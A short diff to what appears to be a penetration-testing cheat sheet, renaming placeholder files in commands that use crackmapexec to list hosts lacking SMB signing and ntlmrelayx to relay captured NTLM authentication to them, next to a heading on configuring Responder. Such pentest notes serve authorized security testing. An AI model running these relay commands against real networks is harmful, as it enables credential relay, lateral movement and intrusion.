@@ -346,12 +346,12 @@ How to pentest like a Gunnaj
 
   ### Evaluate no smb-signing and create an IP txt file for TLMRelayx
   ```shell
-  crackmapexec smb <IPs> --gen-relay-list <outputIPs.txt>
+  crackmapexec smb <IPs> --gen-relay-list <nosmbsigning.txt>
   ```
 
   ### NTLMRelayx
   ```shell
-  sudo python3 ntlmrelayx.py -of <dumofile.txt> -tf <outputIPs.txt> -smb2support
+  sudo python3 ntlmrelayx.py -of <outfile.txt> -tf <nosmbsigning.txt> -smb2support
   ```
 
   ### Disbale SMB and HTTP in Responder.conf
